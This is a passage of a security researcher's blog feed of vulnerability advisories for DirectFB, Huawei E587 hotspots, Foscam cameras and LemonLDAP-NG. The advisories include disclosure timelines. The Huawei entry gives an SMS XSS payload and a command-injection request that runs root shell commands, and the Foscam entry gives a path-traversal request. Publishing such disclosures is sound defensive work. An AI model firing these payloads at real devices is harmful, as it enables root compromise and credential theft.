&lt;/ul&gt;</content><category term="vulnerability"></category><category term="advisory"></category></entry><entry><title>[CVE-2014-2977] DirectFB integer signedness vulnerability</title><link href="https://fredericb.info/2014/05/cve-2014-2977-directfb-integer.html" rel="alternate"></link><published>2014-05-15T16:05:00-07:00</published><updated>2014-05-15T16:05:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-05-15:/2014/05/cve-2014-2977-directfb-integer.html</id><summary type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;DirectFB is prone to an integer signedness vulnerability since
version 1.4.13.&lt;/p&gt;
&lt;p&gt;The vulnerability can be triggered remotely without authentication
through Voodoo interface (network layer of DirectFB).
&lt;h2&gt;Details&lt;/h2&gt;
This integer coercion error may lead to a stack overflow.&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable&lt;/li&gt;
&lt;li&gt;Access Complexity …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;DirectFB is prone to an integer signedness vulnerability since
version 1.4.13.&lt;/p&gt;
&lt;p&gt;The vulnerability can be triggered remotely without authentication
through Voodoo interface (network layer of DirectFB).
&lt;h2&gt;Details&lt;/h2&gt;
This integer coercion error may lead to a stack overflow.&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable&lt;/li&gt;
&lt;li&gt;Access Complexity: Low&lt;/li&gt;
&lt;li&gt;Authentication: None&lt;/li&gt;
&lt;li&gt;Confidentiality Impact: Complete&lt;/li&gt;
&lt;li&gt;Integrity Impact: Complete&lt;/li&gt;
&lt;li&gt;Availability Impact: Complete&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2014-03-27 Developer notified&lt;/li&gt;
&lt;li&gt;2014-04-21 CVE-2014-2977 assigned&lt;/li&gt;
&lt;li&gt;2014-05-16 Public advisory&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;http://www.directfb.org/&lt;/li&gt;
&lt;li&gt;http://mail.directfb.org/pipermail/directfb-dev/2014-March/006805.html&lt;/li&gt;
&lt;/ul&gt;</content><category term="vulnerability"></category><category term="advisory"></category></entry><entry><title>dfb-wireshark-dissector : DirectFB Voodoo protocol dissector for Wireshark</title><link href="https://fredericb.info/2014/05/dfb-wireshark-dissector-directfb-voodoo.html" rel="alternate"></link><published>2014-05-15T15:48:00-07:00</published><updated>2014-05-15T15:48:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-05-15:/2014/05/dfb-wireshark-dissector-directfb-voodoo.html</id><summary type="html">&lt;p&gt;&lt;a href="http://directfb.org/index.php?path=Platform/Voodoo"&gt;Voodoo&lt;/a&gt;&amp;nbsp;is the network layer of &lt;a href="http://directfb.org/"&gt;DirectFB&lt;/a&gt;. &lt;a href="https://github.com/frederic/dfb-wireshark-dissector"&gt;dfb-wireshark-dissector&lt;/a&gt; is a Wireshark plugin to dissect this protocol.&lt;br /&gt;Main features are :&lt;br /&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;Both packet &amp;amp; raw modes are supported ;&lt;/li&gt;&lt;li&gt;FLZ decompression ;&lt;/li&gt;&lt;li&gt;Instance ID resolution.&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;Source code can be found on &lt;a href="https://github.com/frederic/dfb-wireshark-dissector"&gt;Github&lt;/a&gt;.&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;a href="http://directfb.org/index.php?path=Platform/Voodoo"&gt;Voodoo&lt;/a&gt;&amp;nbsp;is the network layer of &lt;a href="http://directfb.org/"&gt;DirectFB&lt;/a&gt;. &lt;a href="https://github.com/frederic/dfb-wireshark-dissector"&gt;dfb-wireshark-dissector&lt;/a&gt; is a Wireshark plugin to dissect this protocol.&lt;br /&gt;Main features are :&lt;br /&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;Both packet &amp;amp; raw modes are supported ;&lt;/li&gt;&lt;li&gt;FLZ decompression ;&lt;/li&gt;&lt;li&gt;Instance ID resolution.&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;Source code can be found on &lt;a href="https://github.com/frederic/dfb-wireshark-dissector"&gt;Github&lt;/a&gt;.&lt;/p&gt;</content><category term="tool"></category><category term="wireshark"></category><category term="directfb"></category></entry><entry><title>Axis Camera M1011 Remote Code Execution Exploit</title><link href="https://fredericb.info/2013/07/axis-camera-m1011-remote-code-execution.html" rel="alternate"></link><published>2013-07-31T08:22:00-07:00</published><updated>2013-07-31T08:22:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2013-07-31:/2013/07/axis-camera-m1011-remote-code-execution.html</id><summary type="html">&lt;p&gt;In January 2013, &lt;a href="https://community.rapid7.com/community/infosec/blog/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play"&gt;Rapid7 published&lt;/a&gt; a &lt;a href="https://community.rapid7.com/docs/DOC-2150"&gt;great paper&lt;/a&gt; describing several vulnerabilities in the most common UPnP libraries.
Six months later, many devices based on these libraries have not been updated and are still exposed.&lt;/p&gt;
&lt;p&gt;For example, the Axis M1011 camera contains a vulnerable version of libupnp, which can lead to …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In January 2013, &lt;a href="https://community.rapid7.com/community/infosec/blog/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play"&gt;Rapid7 published&lt;/a&gt; a &lt;a href="https://community.rapid7.com/docs/DOC-2150"&gt;great paper&lt;/a&gt; describing several vulnerabilities in the most common UPnP libraries.
Six months later, many devices based on these libraries have not been updated and are still exposed.&lt;/p&gt;
&lt;p&gt;For example, the Axis M1011 camera contains a vulnerable version of libupnp, which can lead to arbitrary remote code execution without authentication.&lt;/p&gt;
&lt;p&gt;You can find the corresponding &lt;a href="https://github.com/frederic/metasploit-framework/blob/master/modules/exploits/multi/upnp/libupnp_ssdp_overflow.rb"&gt;metasploit module on my Github&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To check whether your devices are vulnerable to known UPnP attacks, you can use &lt;a href="https://www.rapid7.com/resources/free-security-software-downloads/universal-plug-and-play-jan-2013.jsp"&gt;ScanNow&lt;/a&gt; tool by Rapid7.&lt;/p&gt;</content><category term="vulnerability"></category><category term="advisory"></category></entry><entry><title>Huawei Mobile Hostpot remote root code execution by SMS (user-triggered)</title><link href="https://fredericb.info/2013/07/huawei-mobile-hostpot-remote-root-code.html" rel="alternate"></link><published>2013-07-15T03:59:00-07:00</published><updated>2013-07-15T03:59:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2013-07-15:/2013/07/huawei-mobile-hostpot-remote-root-code.html</id><summary type="html">&lt;p&gt;Huawei E587 3G Mobile Hotspot, version 11.203.27, is prone to two vulnerabilities
in WebUI; an XSS and a command injection.&lt;br&gt;
The combination of both allows an attacker (with a little help from
the victim) to&amp;nbsp;remotely&amp;nbsp;execute code on the device with
root privileges, by sending a specifically …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Huawei E587 3G Mobile Hotspot, version 11.203.27, is prone to two vulnerabilities
in WebUI; an XSS and a command injection.&lt;br&gt;
The combination of both allows an attacker (with a little help from
the victim) to&amp;nbsp;remotely&amp;nbsp;execute code on the device with
root privileges, by sending a specifically&amp;nbsp;crafted SMS.&lt;br&gt;
The vendor has been notified on the 2013/03/18.&lt;/p&gt;
&lt;h3&gt;Huawei WebUI XSS in SMS inbox page&lt;/h3&gt;

&lt;p&gt;In /js/main.js, function&amp;nbsp;smsReplaceData() is used to escape
HTML tags in incoming SMS before displaying them in the UI.&lt;br&gt;
But a&amp;nbsp;specifically&amp;nbsp;crafted SMS can bypass this flawed
function and inject HTML tags in SMS inbox page:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Index&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;0&amp;#39;/&amp;gt;&lt;span class="cp"&gt;&amp;lt;![CDATA[&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;alert(1);&amp;lt;/script&amp;gt;&amp;lt;input type=&amp;quot;checkbox&amp;quot; id=&amp;#39;x]]&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Index&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Coucou, tu veux voir ma balise ?
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This XSS is executed when the user browses to SMS inbox page. The
device has a notifying icon on its tiny screen to alert user of
incoming SMS.&lt;/p&gt;
&lt;h3&gt;Huawei WebUI Shell injection (CVE-2013-2612)&lt;/h3&gt;

&lt;p&gt;The HTTP endpoint "/api/device/time" in WebUI is vulnerable to
shell command injection. This allows code execution with root
privileges.&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;javascript:saveAjaxData(&amp;quot;api/device/time&amp;quot;,&amp;quot;&lt;span class="cp"&gt;&amp;lt;?xml ?&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;request&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Month&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;;mkdir &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Month&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Day&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;/tmp/A #&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Day&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Hour&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Hour&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Min&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Min&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Year&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Year&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Sec&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Sec&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;request&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&amp;quot;);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You need to split your shell command into children of
&amp;lt;request&amp;gt; node in order to respect the 7 chars limit for each
child nodes.&lt;br&gt;
&lt;br&gt;
Now, you may try to combine them.&lt;/p&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="xss"></category><category term="CVE-2013-2612"></category><category term="huawei"></category></entry><entry><title>[CVE-2013-2612] Huawei E587 3G Mobile Hotspot Command Injection</title><link href="https://fredericb.info/2013/07/cve-2013-2612-huawei-e587-3g-mobile.html" rel="alternate"></link><published>2013-07-15T03:58:00-07:00</published><updated>2013-07-15T03:58:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2013-07-15:/2013/07/cve-2013-2612-huawei-e587-3g-mobile.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

[CVE-2013-2612] Huawei E587 3G Mobile Hotspot Command Injection
________________________________________________________________________
Summary:
Huawei E587 3G Mobile Hotspot, version 11.203.27, is prone to a command
injection vulnerability in the Web UI.

Successful exploitation allows unauthenticated attackers to execute
arbitrary commands with root privileges.
________________________________________________________________________
Details …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

[CVE-2013-2612] Huawei E587 3G Mobile Hotspot Command Injection
________________________________________________________________________
Summary:
Huawei E587 3G Mobile Hotspot, version 11.203.27, is prone to a command
injection vulnerability in the Web UI.

Successful exploitation allows unauthenticated attackers to execute
arbitrary commands with root privileges.
________________________________________________________________________
Details:
The HTTP endpoint &amp;quot;/api/device/time&amp;quot; in Web UI is vulnerable to shell
command injection. This allows code execution with root privileges.
________________________________________________________________________
CVSS Version 2 Metrics:
Access Vector: Network exploitable
Access Complexity: Low
Authentication: Not required to exploit
Confidentiality Impact: Complete
Integrity Impact: Complete
Availability Impact: Complete
________________________________________________________________________
Disclosure Timeline:
2013-03-18 Vendor notified
2013-03-18 CVE-2013-2612 assigned
2013-07-15 Public advisory
________________________________________________________________________
References:
http://www.huawei.com/en/security/psirt/
________________________________________________________________________
Frédéric Basse
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.12 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/

iQEcBAEBAgAGBQJR48qZAAoJENQ4kG3hg80AJMEH/Rdyx2zmDPzr2Ar5Nc+Fw1ih
aiby28PhIKfXhAst2SrkIp6ogtDEj+PBrgbEy2YJlyKi01z1Uf2UGukxijlQTg7H
0zYivz55vleBrr9OD/A2pxo7sZZy7eswH5jia5abRUVXYYqEVWYp5KWvzbMPO3CY
EgLYxE4uv00ojqHCl9QsD7oa+mR52Jur3QZ/IdCbJJZgmEKmwNJvJ8rb6RvTMcae
+8dWhC8bhfL3UkTW5snYZ4K/euA84LmGvcfd1PXrMAX01xXDdnPJ/JxrzSPLfb1x
6WyZO6cZpgxQqvogemXKOy2MmnNkWlkK0P9OmmDpBQBI66WnyBUxXNFxEr/HFKo=
=6yIl
-----END PGP SIGNATURE-----
&lt;/pre&gt;&lt;/div&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="CVE-2013-2612"></category><category term="huawei"></category></entry><entry><title>[CVE-2013-2560] Foscam &lt;= 11.37.2.48 path traversal vulnerability</title><link href="https://fredericb.info/2013/03/cve-2013-2560-foscam-1137248-path.html.html" rel="alternate"></link><published>2013-03-17T14:39:00-07:00</published><updated>2013-03-17T14:39:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2013-03-17:/2013/03/cve-2013-2560-foscam-1137248-path.html.html</id><summary type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;Foscam firmware &amp;lt;= 11.37.2.48 is prone to a path traversal
vulnerability in the embedded web interface.&lt;/p&gt;
&lt;p&gt;The unauthenticated attacker can access to the entire filesystem and
steal web &amp;amp; wifi credentials.&lt;/p&gt;
&lt;h2&gt;Details&lt;/h2&gt;

&lt;p&gt;GET //../proc/kcore HTTP/1.0&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable&lt;/li&gt;
&lt;li&gt;Access Complexity …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;Foscam firmware &amp;lt;= 11.37.2.48 is prone to a path traversal
vulnerability in the embedded web interface.&lt;/p&gt;
&lt;p&gt;The unauthenticated attacker can access to the entire filesystem and
steal web &amp;amp; wifi credentials.&lt;/p&gt;
&lt;h2&gt;Details&lt;/h2&gt;

&lt;p&gt;GET //../proc/kcore HTTP/1.0&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable&lt;/li&gt;
&lt;li&gt;Access Complexity: Low&lt;/li&gt;
&lt;li&gt;Authentication: Not required to exploit&lt;/li&gt;
&lt;li&gt;Confidentiality Impact: Complete&lt;/li&gt;
&lt;li&gt;Availability Impact: Complete&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2013-01-18 Vendor fixed the issue in fw 11.37.2.49; no security notice&lt;/li&gt;
&lt;li&gt;2013-02-21 Vulnerability found&lt;/li&gt;
&lt;li&gt;2013-03-01 Public advisory&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Solution&lt;/h2&gt;

&lt;p&gt;A new firmware is available on vendor's site: &lt;a href="http://www.foscam.com/down3.aspx"&gt;http://www.foscam.com/down3.aspx&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;http://code.google.com/p/bflt-utils/&lt;/li&gt;
&lt;li&gt;http://wiki.openipcam.com/&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Arnaud Calmejane - Frederic Basse&lt;/p&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="foscam"></category></entry><entry><title>[CVE-2012-6426] LemonLDAP-NG SAML XML Signature Wrapping</title><link href="https://fredericb.info/2013/03/cve-2012-6426-lemonldap-ng-saml-xml.html" rel="alternate"></link><published>2013-03-17T14:31:00-07:00</published><updated>2013-03-17T14:31:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2013-03-17:/2013/03/cve-2012-6426-lemonldap-ng-saml-xml.html</id><summary type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;LemonLDAP-NG &amp;lt;=1.2.2 is prone to a security vulnerability involving
XML signature wrapping in authentication process.&lt;/p&gt;
&lt;p&gt;Successful exploits may allow unauthenticated attackers to construct
specially crafted messages that can be successfully verified and
contain arbitrary content.&lt;/p&gt;
&lt;p&gt;This may lead to authentication bypass.&lt;/p&gt;
&lt;h2&gt;Details&lt;/h2&gt;

&lt;p&gt;Due to a bad use …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;LemonLDAP-NG &amp;lt;=1.2.2 is prone to a security vulnerability involving
XML signature wrapping in authentication process.&lt;/p&gt;
&lt;p&gt;Successful exploits may allow unauthenticated attackers to construct
specially crafted messages that can be successfully verified and
contain arbitrary content.&lt;/p&gt;
&lt;p&gt;This may lead to authentication bypass.&lt;/p&gt;
&lt;h2&gt;Details&lt;/h2&gt;

&lt;p&gt;Due to a bad use of Lasso library, SAML signatures are never checked,
even if SP forces signature check.&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable&lt;/li&gt;
&lt;li&gt;Access Complexity: Low&lt;/li&gt;
&lt;li&gt;Authentication: Not required to exploit&lt;/li&gt;
&lt;li&gt;Impact Type:Allows unauthorized disclosure of information; Allows unauthorized modification&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2012-11-08 Vendor contacted&lt;/li&gt;
&lt;li&gt;2012-12-18 Vendor: fixed issue in svn r2698&lt;/li&gt;
&lt;li&gt;2012-12-19 CVE-2012-6426 assigned&lt;/li&gt;
&lt;li&gt;2012-12-20 Public advisory&lt;/li&gt;
&lt;li&gt;2012-12-21 EoW&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;References&lt;/h2&gt;

&lt;p&gt;&lt;a href="http://jira.ow2.org/browse/LEMONLDAP-570"&gt;http://jira.ow2.org/browse/LEMONLDAP-570&lt;/a&gt;&lt;/p&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="lemonldap"></category></entry></feed>